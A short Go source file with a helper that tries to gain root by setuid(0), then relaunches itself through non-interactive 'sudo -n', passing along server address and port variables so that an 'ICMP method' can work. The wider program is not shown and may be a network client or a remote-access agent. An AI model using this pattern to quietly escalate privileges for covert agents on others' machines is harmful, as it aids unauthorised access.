//go:build !windows

package main

import (
	"log"
	"os"
	"os/exec"
	"syscall"
)

func isRoot() bool {
	return os.Geteuid() == 0
}

func ensureRoot() {
	if isRoot() {
		return
	}

	if os.Getenv("ROOT_RELAUNCH") == "1" {
		log.Println("[!] Not running as root — ICMP will NOT work")
		return
	}

	if err := syscall.Setuid(0); err == nil {
		if isRoot() {
			return
		}
	}

	exePath, err := os.Executable()
	if err == nil {
		cmd := exec.Command("sudo", "-n", exePath)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Env = append(os.Environ(),
			"SERVER_IP="+ServerIP,
			"SERVER_PORT="+ServerPort,
			"ROOT_RELAUNCH=1",
		)
		if err := cmd.Start(); err == nil {
			os.Exit(0)
		}
	}

	log.Println("[!] Could not escalate to root — ICMP method disabled")
}